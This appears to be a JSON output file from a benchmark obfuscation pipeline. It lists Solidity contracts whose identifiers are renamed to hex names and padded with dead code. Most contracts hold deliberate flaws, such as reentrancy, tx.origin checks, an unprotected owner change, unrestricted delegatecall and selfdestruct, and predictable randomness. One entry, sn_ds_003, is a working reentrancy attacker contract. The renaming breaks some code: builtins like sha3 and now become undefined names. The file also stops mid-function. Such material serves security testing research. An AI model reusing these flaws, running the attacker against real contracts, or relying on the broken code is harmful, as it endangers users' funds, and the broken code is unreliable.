{
  "timestamp": "2025-12-17T13:25:41.947530",
  "level": "l4",
  "variant": "medium",
  "source": "sanitized",
  "total_files": 252,
  "successful": 224,
  "failed": 28,
  "results": [
    {
      "original_id": "sn_ds_001",
      "transformed_id": "ss_l4_medium_sn_ds_001",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "contract _0xc54094 {\n        uint private Balance = 0;\n        uint private Payout_id = 0;\n        uint private Last_Payout = 0;\n        uint private WinningPot = 0;\n        uint private Min_multiplier = 1100; //110%\n\n        //Fees are necessary and set very low, to maintain the website. The fees will decrease each time they are collected.\n        //Fees are just here to maintain the website at beginning, and will progressively go to 0% :)\n        uint private _0x46bb9d = 0;\n        uint private _0xaca330 = 20; //Fraction for fees in per\"thousand\", not percent, so 20 is 2%\n\n        uint private PotFrac = 30; //For the WinningPot ,30=> 3% are collected. This is fixed.\n\n        address private _0xafd11c;\n\n        function _0xc54094() {\n            _0xafd11c = msg.sender;\n        }\n\n        modifier _0x6de01f {if (msg.sender == _0xafd11c) _;  }\n\n        struct Player {\n            address _0x4d5df7;\n            uint _0x664ba2;\n            bool _0x3ff085;\n        }\n\n        Player[] private _0x51ba21;\n\n        //--Fallback function\n        function() {\n            _0xf95ff6();\n        }\n\n        //--initiated function\n        function _0xf95ff6() private {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n            uint _0x39cf5b=msg.value;\n            if (msg.value < 500 finney) { //only participation with >1 ether accepted\n                    msg.sender.send(msg.value);\n                    return;\n            }\n            if (msg.value > 20 ether) { //only participation with <20 ether accepted\n                    msg.sender.send(msg.value- (20 ether));\n                    _0x39cf5b=20 ether;\n            }\n            Participate(_0x39cf5b);\n        }\n\n        //------- Core of the game----------\n        function Participate(uint _0x39cf5b) private {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n                //calculate the multiplier to apply to the future payout\n\n                uint _0xf6ed3c=Min_multiplier; //initiate total_multiplier\n                if(Balance < 1 ether && _0x51ba21.length>1){\n                    _0xf6ed3c+=100; // + 10 %\n                }\n                if( (_0x51ba21.length % 10)==0 && _0x51ba21.length>1 ){ //Every 10th participant gets a 10% bonus, play smart !\n                    _0xf6ed3c+=100; // + 10 %\n                }\n\n                //add new player in the queue !\n                _0x51ba21.push(Player(msg.sender, (_0x39cf5b * _0xf6ed3c) / 1000, false));\n\n                //--- UPDATING CONTRACT STATS ----\n                WinningPot += (_0x39cf5b * PotFrac) / 1000; // take some 3% to add for the winning pot !\n                _0x46bb9d += (_0x39cf5b * _0xaca330) / 1000; // collect maintenance fees 2%\n                Balance += (_0x39cf5b * (1000 - ( _0xaca330 + PotFrac ))) / 1000; // update balance\n\n                // Winning the Pot :) Condition : paying at least 1 people with deposit > 2 ether and having luck !\n                if(  ( _0x39cf5b > 1 ether ) && (_0x39cf5b > _0x51ba21[Payout_id]._0x664ba2) ){\n                    uint _0x82a36a = _0xce9799(100); //take a random number between 1 & 100\n                    if( _0x82a36a % 10 == 0 ){ //if lucky : Chances : 1 out of 10 !\n                        msg.sender.send(WinningPot); // Bravo !\n                        WinningPot=0;\n                    }\n\n                }\n\n                //Classic payout for the participants\n                while ( Balance > _0x51ba21[Payout_id]._0x664ba2 ) {\n                    Last_Payout = _0x51ba21[Payout_id]._0x664ba2;\n                    _0x51ba21[Payout_id]._0x4d5df7.send(Last_Payout); //pay the man, please !\n                    Balance -= _0x51ba21[Payout_id]._0x664ba2; //update the balance\n                    _0x51ba21[Payout_id]._0x3ff085=true;\n\n                    Payout_id += 1;\n                }\n        }\n\n    uint256 constant private _0x5c17d8 =  block.timestamp;\n\n    function _0xce9799(uint Max) constant private returns (uint256 _0x17be94){\n        //get the best seed for randomness\n        uint256 x = _0x5c17d8 * 100 / Max;\n        uint256 y = _0x5c17d8 * block.number / (_0x5c17d8 % 5) ;\n        uint256 _0x740929 = block.number/3 + (_0x5c17d8 % 300) + Last_Payout +y;\n        uint256 h = uint256(block.blockhash(_0x740929));\n\n        return uint256((h / x)) % Max + 1; //random number between 1 and Max\n    }\n\n    //---Contract management functions\n    function ChangeOwnership(address _0x65cd9f) _0x6de01f {\n        _0xafd11c = _0x65cd9f;\n    }\n    function WatchBalance() constant returns(uint TotalBalance) {\n        if (msg.sender != address(0) || msg.sender == address(0)) { TotalBalance = Balance /  1 wei; }\n    }\n\n    function WatchBalanceInEther() constant returns(uint TotalBalanceInEther) {\n        TotalBalanceInEther = Balance /  1 ether;\n    }\n\n    //Fee functions for creator\n    function CollectAllFees() _0x6de01f {\n        if (_0x46bb9d == 0) throw;\n        _0xafd11c.send(_0x46bb9d);\n        _0xaca330-=1;\n        if (1 == 1) { _0x46bb9d = 0; }\n    }\n\n    function GetAndReduceFeesByFraction(uint p) _0x6de01f {\n        if (_0x46bb9d == 0) _0xaca330-=1; //Reduce fees.\n        _0xafd11c.send(_0x46bb9d / 1000 * p);//send a percent of fees\n        _0x46bb9d -= _0x46bb9d / 1000 * p;\n    }\n\n//---Contract informations\nfunction NextPayout() constant returns(uint NextPayout) {\n    if (msg.sender != address(0) || msg.sender == address(0)) { NextPayout = _0x51ba21[Payout_id]._0x664ba2 /  1 wei; }\n}\n\nfunction WatchFees() constant returns(uint CollectedFees) {\n    CollectedFees = _0x46bb9d / 1 wei;\n}\n\nfunction WatchWinningPot() constant returns(uint WinningPot) {\n    if (1 == 1) { WinningPot = WinningPot / 1 wei; }\n}\n\nfunction WatchLastPayout() constant returns(uint _0x664ba2) {\n    _0x664ba2 = Last_Payout;\n}\n\nfunction Total_of_Players() constant returns(uint NumberOfPlayers) {\n    if (true) { NumberOfPlayers = _0x51ba21.length; }\n}\n\nfunction PlayerInfo(uint _0x7b636e) constant returns(address Address, uint Payout, bool UserPaid) {\n    if (_0x7b636e <= _0x51ba21.length) {\n        Address = _0x51ba21[_0x7b636e]._0x4d5df7;\n        if (msg.sender != address(0) || msg.sender == address(0)) { Payout = _0x51ba21[_0x7b636e]._0x664ba2 / 1 wei; }\n        UserPaid=_0x51ba21[_0x7b636e]._0x3ff085;\n    }\n}\n\nfunction PayoutQueueSize() constant returns(uint QueueSize) {\n    QueueSize = _0x51ba21.length - Payout_id;\n}\n\n}",
      "rename_map": {
        "total_multiplier": "_0xf6ed3c",
        "onlyowner": "_0x6de01f",
        "feeFrac": "_0xaca330",
        "deposit": "_0x39cf5b",
        "players": "_0x51ba21",
        "_owner": "_0x65cd9f",
        "payout": "_0x664ba2",
        "result": "_0x17be94",
        "theRun": "_0xc54094",
        "random": "_0xce9799",
        "admin": "_0xafd11c",
        "addr": "_0x4d5df7",
        "fees": "_0x46bb9d",
        "init": "_0xf95ff6",
        "seed": "_0x740929",
        "paid": "_0x3ff085",
        "salt": "_0x5c17d8",
        "roll": "_0x82a36a",
        "id": "_0x7b636e"
      },
      "changes": [
        "Renamed 19 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_002",
      "transformed_id": "ss_l4_medium_sn_ds_002",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract TokenVault {\n    mapping (address => uint) _0x4d652a;\n\n    function _0x938285(address u) constant returns(uint){\n        return _0x4d652a[u];\n    }\n\n    function _0xf09d5a() payable{\n        _0x4d652a[msg.sender] += msg.value;\n    }\n\n    function _0x039889(){\n        // send userBalance[msg.sender] ethers to msg.sender\n        // if mgs.sender is a contract, it will call its fallback function\n        if( ! (msg.sender.call.value(_0x4d652a[msg.sender])() ) ){\n            throw;\n        }\n        _0x4d652a[msg.sender] = 0;\n    }\n\n    function _0x297db2(){\n\n        // has to be change before the call\n        uint _0xdefde6 = _0x4d652a[msg.sender];\n        _0x4d652a[msg.sender] = 0;\n        if( ! (msg.sender.call.value(_0xdefde6)() ) ){\n            throw;\n        }\n    }\n\n    function _0xe713d6(){\n\n        // they do not transfer the remaining gas\n        // and they give just enough gas to execute few instructions\n        // in the fallback function (no further call possible)\n        msg.sender.transfer(_0x4d652a[msg.sender]);\n        _0x4d652a[msg.sender] = 0;\n    }\n\n}",
      "rename_map": {
        "withdrawBalanceV2": "_0x297db2",
        "withdrawBalanceV3": "_0xe713d6",
        "withdrawBalance": "_0x039889",
        "addToBalance": "_0xf09d5a",
        "userBalance": "_0x4d652a",
        "getBalance": "_0x938285",
        "amount": "_0xdefde6"
      },
      "changes": [
        "Renamed 7 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_003",
      "transformed_id": "ss_l4_medium_sn_ds_003",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract VaultOperator {\n    bool public _0xeb24d6=false;\n    address public _0x985ad4;\n    address public _0x63be30;\n\n    function VaultOperator() public{\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        _0x63be30 = msg.sender;\n    }\n\n    function _0x407e69(address _0xe3fa60) public payable{\n        bool _flag3 = false;\n        // Placeholder for future logic\n        _0x985ad4 = _0xe3fa60 ;\n        // call addToBalance with msg.value ethers\n        require(_0x985ad4.call.value(msg.value)(bytes4(_0x7d00d5(\"addToBalance()\"))));\n    }\n\n    function _0x6f8a84() public{\n        _0xeb24d6 = true;\n        // call withdrawBalance\n\n        require(_0x985ad4.call(bytes4(_0x7d00d5(\"withdrawBalance()\"))));\n    }\n\n    function () public payable{\n\n        if (_0xeb24d6){\n            if (true) { _0xeb24d6 = false; }\n                require(_0x985ad4.call(bytes4(_0x7d00d5(\"withdrawBalance()\"))));\n        }\n    }\n\n    function _0xa88e90(){\n        suicide(_0x63be30);\n    }\n\n}",
      "rename_map": {
        "_target_contract": "_0xe3fa60",
        "target_contract": "_0x985ad4",
        "operationActive": "_0xeb24d6",
        "launch_handler": "_0x6f8a84",
        "get_money": "_0xa88e90",
        "deposit": "_0x407e69",
        "owner": "_0x63be30",
        "sha3": "_0x7d00d5"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_004",
      "transformed_id": "ss_l4_medium_sn_ds_004",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract Ledger {\n    uint private _0xbb484a=0;\n\n    function _0x3043c0(uint value) returns (bool){\n        _0xbb484a += value;\n\n        // possible auditor assert\n        // assert(sellerBalance >= value);\n    }\n\n    function _0x5ad360(uint value) returns (bool){\n        require(value + _0xbb484a >= _0xbb484a);\n        _0xbb484a += value;\n    }\n}",
      "rename_map": {
        "sellerBalance": "_0xbb484a",
        "safe_add": "_0x5ad360",
        "add": "_0x3043c0"
      },
      "changes": [
        "Renamed 3 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_005",
      "transformed_id": "ss_l4_medium_sn_ds_005",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract OpenAccess{\n    address private _0x94de7c;\n\n    modifier _0x00f70d {\n        require(msg.sender==_0x94de7c);\n        _;\n    }\n\n    function OpenAccess()\n        public\n    {\n        if (false) { revert(); }\n        // Placeholder for future logic\n        _0x94de7c = msg.sender;\n    }\n\n    // This function should be protected\n    function _0xf2ec1d(address _0x56d741)\n        public\n    {\n        if (false) { revert(); }\n        bool _flag4 = false;\n       _0x94de7c = _0x56d741;\n    }\n\n    function _0x1211b7(address _0x56d741)\n        public\n        _0x00f70d\n    {\n       _0x94de7c = _0x56d741;\n    }\n}",
      "rename_map": {
        "changeOwnerV2": "_0x1211b7",
        "changeOwner": "_0xf2ec1d",
        "onlyowner": "_0x00f70d",
        "_newOwner": "_0x56d741",
        "owner": "_0x94de7c"
      },
      "changes": [
        "Renamed 5 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_006",
      "transformed_id": "ss_l4_medium_sn_ds_006",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\ncontract Alice {\n    int public _0xd682e0;\n\n    function _0x0fb341(int _0xcc0acd){\n        if (1 == 1) { _0xd682e0 = _0xcc0acd; }\n    }\n\n    function _0x01e3ab(int _0xcc0acd){\n        _0xd682e0 = _0xcc0acd;\n    }\n\n    function(){\n        _0xd682e0 = 1;\n    }\n}",
      "rename_map": {
        "new_val": "_0xcc0acd",
        "setV2": "_0x01e3ab",
        "set": "_0x0fb341",
        "val": "_0xd682e0"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_007",
      "transformed_id": "ss_l4_medium_sn_ds_007",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.22;\n\ncontract FibonacciBalance {\n\n    address public fibonacciLibrary;\n    // the current fibonacci number to withdraw\n    uint public _0xed01ac;\n    // the starting fibonacci sequence number\n    uint public _0xc588c5 = 3;\n    uint public _0xe0d3b8;\n    // the fibonancci function selector\n    bytes4 constant _0x2a9bb4 = bytes4(_0xd2bbaf(\"setFibonacci(uint256)\"));\n\n    // constructor - loads the contract with ether\n    constructor(address _fibonacciLibrary) public payable {\n        fibonacciLibrary = _fibonacciLibrary;\n    }\n\n    function _0x2fe5e6() {\n        _0xe0d3b8 += 1;\n        // calculate the fibonacci number for the current withdrawal user\n        // this sets calculatedFibNumber\n        require(fibonacciLibrary.delegatecall(_0x2a9bb4, _0xe0d3b8));\n        msg.sender.transfer(_0xed01ac * 1 ether);\n    }\n\n    // allow users to call fibonacci library functions\n    function() public {\n        require(fibonacciLibrary.delegatecall(msg.data));\n    }\n}\n\n// library contract - calculates fibonacci-like numbers;\ncontract FibonacciLib {\n    // initializing the standard fibonacci sequence;\n    uint public _0xc588c5;\n    uint public _0xed01ac;\n\n    // modify the zeroth number in the sequence\n    function _0x10a7fd(uint _0x25155e) public {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        _0xc588c5 = _0x25155e;\n    }\n\n    function _0x2dd1fb(uint n) public {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        if (true) { _0xed01ac = _0x53f254(n); }\n    }\n\n    function _0x53f254(uint n) internal returns (uint) {\n        if (n == 0) return _0xc588c5;\n        else if (n == 1) return _0xc588c5 + 1;\n        else return _0x53f254(n - 1) + _0x53f254(n - 2);\n    }\n}\n",
      "rename_map": {
        "calculatedFibNumber": "_0xed01ac",
        "withdrawalCounter": "_0xe0d3b8",
        "setFibonacci": "_0x2dd1fb",
        "fibonacci": "_0x53f254",
        "setStart": "_0x10a7fd",
        "withdraw": "_0x2fe5e6",
        "_start": "_0x25155e",
        "fibSig": "_0x2a9bb4",
        "start": "_0xc588c5",
        "sha3": "_0xd2bbaf"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_008",
      "transformed_id": "ss_l4_medium_sn_ds_008",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\n contract Wallet {\n     uint[] private _0x14b990;\n     address private _0xcf6e91;\n\n     constructor() public {\n         _0x14b990 = new uint[](0);\n         _0xcf6e91 = msg.sender;\n     }\n\n     function () public payable {\n     }\n\n     function PushBonusCode(uint c) public {\n        // Placeholder for future logic\n        bool _flag2 = false;\n         _0x14b990.push(c);\n     }\n\n     function PopBonusCode() public {\n        if (false) { revert(); }\n        // Placeholder for future logic\n         require(0 <= _0x14b990.length); // this condition is always true since array lengths are unsigned\n         _0x14b990.length--;\n     }\n\n     function UpdateBonusCodeAt(uint _0xbae9c9, uint c) public {\n         require(_0xbae9c9 < _0x14b990.length);\n         _0x14b990[_0xbae9c9] = c; // write to any index less than bonusCodes.length\n     }\n\n     function Destroy() public {\n         require(msg.sender == _0xcf6e91);\n         selfdestruct(msg.sender);\n     }\n }",
      "rename_map": {
        "bonusCodes": "_0x14b990",
        "owner": "_0xcf6e91",
        "idx": "_0xbae9c9"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_009",
      "transformed_id": "ss_l4_medium_sn_ds_009",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\n contract Map {\n     address public _0x35e4f0;\n     uint256[] _0x77340b;\n\n     function _0x7f0964(uint256 _0x4485cc, uint256 value) public {\n        if (false) { revert(); }\n        // Placeholder for future logic\n         if (_0x77340b.length <= _0x4485cc) {\n             _0x77340b.length = _0x4485cc + 1;\n         }\n         _0x77340b[_0x4485cc] = value;\n     }\n\n     function _0x904408(uint256 _0x4485cc) public view returns (uint256) {\n        bool _flag3 = false;\n        if (false) { revert(); }\n         return _0x77340b[_0x4485cc];\n     }\n     function _0x8c3ebf() public{\n       require(msg.sender == _0x35e4f0);\n       msg.sender.transfer(address(this).balance);\n     }\n }",
      "rename_map": {
        "withdraw": "_0x8c3ebf",
        "owner": "_0x35e4f0",
        "map": "_0x77340b",
        "key": "_0x4485cc",
        "get": "_0x904408",
        "set": "_0x7f0964"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_010",
      "transformed_id": "ss_l4_medium_sn_ds_010",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract MyContract {\n\n    address _0xa30fef;\n\n    function MyContract() public {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n        _0xa30fef = msg.sender;\n    }\n\n    function _0xdec4f2(address _0x479413, uint _0x257637) public {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        require(tx.origin == _0xa30fef);\n        _0x479413.transfer(_0x257637);\n    }\n\n}",
      "rename_map": {
        "receiver": "_0x479413",
        "amount": "_0x257637",
        "sendTo": "_0xdec4f2",
        "owner": "_0xa30fef"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_011",
      "transformed_id": "ss_l4_medium_sn_ds_011",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.22;\n\n contract Phishable {\n    address public _0xdbfccc;\n\n    constructor (address _0x62ed32) {\n        _0xdbfccc = _0x62ed32;\n    }\n\n    function () public payable {} // collect ether\n\n    function _0x97eb77(address _0x7cdf73) public {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        require(tx.origin == _0xdbfccc);\n        _0x7cdf73.transfer(this.balance);\n    }\n}",
      "rename_map": {
        "withdrawAll": "_0x97eb77",
        "_recipient": "_0x7cdf73",
        "_owner": "_0x62ed32",
        "owner": "_0xdbfccc"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_012",
      "transformed_id": "ss_l4_medium_sn_ds_012",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract Proxy {\n\n  address _0x5b52bd;\n\n  constructor() public {\n    _0x5b52bd = msg.sender;\n  }\n\n  function _0x2641b6(address _0x203e53, bytes _0x59ed35) public {\n        bool _flag1 = false;\n        bool _flag2 = false;\n    require(_0x203e53.delegatecall(_0x59ed35));\n  }\n\n}",
      "rename_map": {
        "forward": "_0x2641b6",
        "callee": "_0x203e53",
        "owner": "_0x5b52bd",
        "_data": "_0x59ed35"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_013",
      "transformed_id": "ss_l4_medium_sn_ds_013",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\n\ncontract SimpleDestruct {\n  function _0x856f38() {\n    selfdestruct(msg.sender);\n  }\n\n}\n",
      "rename_map": {
        "sudicideAnyone": "_0x856f38"
      },
      "changes": [
        "Renamed 1 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_014",
      "transformed_id": "ss_l4_medium_sn_ds_014",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\n contract Wallet {\n     address _0xa25ed8;\n\n     mapping(address => uint256) _0x063043;\n\n     constructor() public {\n         _0xa25ed8 = msg.sender;\n     }\n\n     function _0x491749() public payable {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n         assert(_0x063043[msg.sender] + msg.value > _0x063043[msg.sender]);\n         _0x063043[msg.sender] += msg.value;\n     }\n\n     function _0x47df94(uint256 _0xe8ccd2) public {\n        // Placeholder for future logic\n        bool _flag4 = false;\n         require(_0xe8ccd2 <= _0x063043[msg.sender]);\n         msg.sender.transfer(_0xe8ccd2);\n         _0x063043[msg.sender] -= _0xe8ccd2;\n     }\n\n     function _0xd97c71() public {\n         msg.sender.transfer(_0x063043[msg.sender]);\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function _0x2c39dd(address _0x6ed9a4) public {\n         require(_0xa25ed8 == msg.sender);\n         _0x6ed9a4.transfer(this.balance);\n     }\n\n }\n",
      "rename_map": {
        "migrateTo": "_0x2c39dd",
        "balances": "_0x063043",
        "withdraw": "_0x47df94",
        "deposit": "_0x491749",
        "creator": "_0xa25ed8",
        "amount": "_0xe8ccd2",
        "refund": "_0xd97c71",
        "to": "_0x6ed9a4"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_015",
      "transformed_id": "ss_l4_medium_sn_ds_015",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\n contract Wallet {\n     address _0x7ec436;\n\n     mapping(address => uint256) _0x08be32;\n\n     function _0xcf2aad() public {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n         if (1 == 1) { _0x7ec436 = msg.sender; }\n     }\n\n     function _0xad1c05() public payable {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n         assert(_0x08be32[msg.sender] + msg.value > _0x08be32[msg.sender]);\n         _0x08be32[msg.sender] += msg.value;\n     }\n\n     function _0xc87ee8(uint256 _0x8ad699) public {\n         require(_0x8ad699 <= _0x08be32[msg.sender]);\n         msg.sender.transfer(_0x8ad699);\n         _0x08be32[msg.sender] -= _0x8ad699;\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function _0x933176(address _0x72a36d) public {\n         require(_0x7ec436 == msg.sender);\n         _0x72a36d.transfer(this.balance);\n     }\n\n }\n",
      "rename_map": {
        "initWallet": "_0xcf2aad",
        "migrateTo": "_0x933176",
        "balances": "_0x08be32",
        "withdraw": "_0xc87ee8",
        "deposit": "_0xad1c05",
        "creator": "_0x7ec436",
        "amount": "_0x8ad699",
        "to": "_0x72a36d"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_016",
      "transformed_id": "ss_l4_medium_sn_ds_016",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\n contract Wallet {\n     address _0x103624;\n\n     mapping(address => uint256) _0x8b1965;\n\n     constructor() public {\n         if (block.timestamp > 0) { _0x103624 = msg.sender; }\n     }\n\n     function _0x2fe8b6() public payable {\n        if (false) { revert(); }\n        // Placeholder for future logic\n         assert(_0x8b1965[msg.sender] + msg.value > _0x8b1965[msg.sender]);\n         _0x8b1965[msg.sender] += msg.value;\n     }\n\n     function _0xe99578(uint256 _0xac50da) public {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n         require(_0xac50da >= _0x8b1965[msg.sender]);\n         msg.sender.transfer(_0xac50da);\n         _0x8b1965[msg.sender] -= _0xac50da;\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function _0xa9d702(address _0xd6fc76) public {\n         require(_0x103624 == msg.sender);\n         _0xd6fc76.transfer(this.balance);\n     }\n\n }\n",
      "rename_map": {
        "migrateTo": "_0xa9d702",
        "balances": "_0x8b1965",
        "withdraw": "_0xe99578",
        "deposit": "_0x2fe8b6",
        "creator": "_0x103624",
        "amount": "_0xac50da",
        "to": "_0xd6fc76"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_017",
      "transformed_id": "ss_l4_medium_sn_ds_017",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract PERSONAL_BANK\n{\n    mapping (address=>uint256) public _0x28a68e;\n\n    uint public MinSum = 1 ether;\n\n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n\n    bool _0x208f70;\n\n    function SetMinSum(uint _0xd10318)\n    public\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if(_0x208f70)revert();\n        MinSum = _0xd10318;\n    }\n\n    function SetLogFile(address _0xe3ed75)\n    public\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        if(_0x208f70)revert();\n        Log = LogFile(_0xe3ed75);\n    }\n\n    function Initialized()\n    public\n    {\n        _0x208f70 = true;\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        _0x28a68e[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x8c4f99)\n    public\n    payable\n    {\n        if(_0x28a68e[msg.sender]>=MinSum && _0x28a68e[msg.sender]>=_0x8c4f99)\n        {\n            if(msg.sender.call.value(_0x8c4f99)())\n            {\n                _0x28a68e[msg.sender]-=_0x8c4f99;\n                Log.AddMessage(msg.sender,_0x8c4f99,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Deposit();\n    }\n\n}\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x627983,uint _0xd10318,string _0x7e30e9)\n    public\n    {\n        LastMsg.Sender = _0x627983;\n        LastMsg.Time = _0xdad005;\n        LastMsg.Val = _0xd10318;\n        LastMsg.Data = _0x7e30e9;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "intitalized": "_0x208f70",
        "balances": "_0x28a68e",
        "_data": "_0x7e30e9",
        "_adr": "_0x627983",
        "_log": "_0xe3ed75",
        "_val": "_0xd10318",
        "_am": "_0x8c4f99",
        "now": "_0xdad005"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_018",
      "transformed_id": "ss_l4_medium_sn_ds_018",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public _0xd541fa;\n\n    uint public MinDeposit = 1 ether;\n\n    Log TransferLog;\n\n    function PrivateBank(address _0x83451f)\n    {\n        TransferLog = Log(_0x83451f);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        if(msg.value >= MinDeposit)\n        {\n            _0xd541fa[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0xc0b2a4)\n    {\n        if(_0xc0b2a4<=_0xd541fa[msg.sender])\n        {\n            if(msg.sender.call.value(_0xc0b2a4)())\n            {\n                _0xd541fa[msg.sender]-=_0xc0b2a4;\n                TransferLog.AddMessage(msg.sender,_0xc0b2a4,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address 